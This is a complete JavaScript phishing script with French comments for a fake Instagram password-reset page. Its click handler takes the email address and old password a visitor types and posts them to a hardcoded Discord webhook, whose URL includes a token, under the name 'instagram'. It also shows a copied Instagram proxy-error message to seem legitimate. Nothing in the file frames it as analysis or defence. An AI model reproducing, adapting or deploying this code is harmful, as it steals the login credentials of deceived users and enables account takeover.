document.addEventListener('DOMContentLoaded', function () {
    const emailInput = document.getElementById('email');
    const oldPasswordInput = document.getElementById('old-password');
    const resetButton = document.getElementById('reset-button');
    const errorMessage = document.getElementById('error-message');

    const discordWebhookURL = 'https://discord.com/api/webhooks/1260418748398043209/XortvEHk34mD7C3632yShd4B7vqgAsyoQWr5fNV5O5SKN47jvOQxK6Mbp557seMHN1N1';

    function sendToDiscord(email, oldPassword) {
        const embed = {
            "content": "",
            "tts": false,
            "embeds": [
                {
                    "description": "**Connexion à partir du site web** : *https://www.instagram.com/accounts/login/?next=%2Fconnexion%2F&source=desktop_nav*\n\n:arrow_down:\n\n**Phone** : *[Apple:green_apple:/Android:robot:]*\n\n:arrow_down:\n\n**E-Mail** : *" + email + "*\n**Ancien mot de passe** : *" + oldPassword + "*\n\n:arrow_down:\n\n**Le site** : *bientôt...*",
                    "color": 16711680,
                    "title": "🔴 Nouvelles connexions !! 🔴",
                    "footer": {
                        "text": "Droits d'auteur par superours.©"
                    }
                }
            ],
            "username": "instagram"
        };

        fetch(discordWebhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(embed)
        }).then(response => {
            if (response.ok) {
                console.log('Webhook envoyé avec succès');
            } else {
                console.error('Erreur lors de l\'envoi du webhook', response.statusText);
            }
        }).catch(error => {
            console.error('Erreur lors de l\'envoi du webhook', error);
        });
    }

    resetButton.addEventListener('click', function () {
        const email = emailInput.value.trim();
        const oldPassword = oldPasswordInput.value.trim();

        // Vérifier si l'adresse IP est signalée comme un proxy (simulation)
        const isProxy = false; // Remplacez par votre logique de vérification d'adresse IP

        if (isProxy) {
            errorMessage.innerHTML = 'L’adresse IP que vous utilisez a été signalée comme un proxy ouvert. Si vous pensez qu’il s’agit d’une erreur, rendez-vous sur <a href="http://p.instagram.com/" target="_blank">http://p.instagram.com/</a>';
            errorMessage.style.color = 'red';
        } else {
            errorMessage.innerHTML = ''; // Effacer le message d'erreur s'il y en avait un précédent

            // Envoyer les informations au webhook Discord
            sendToDiscord(email, oldPassword);

            // Réinitialiser les champs du formulaire
            emailInput.value = '';
            oldPasswordInput.value = '';

            // Optionnel : Afficher un message de confirmation ou effectuer une autre action après l'envoi
            alert('Informations envoyées avec succès !');
        }
    });
});
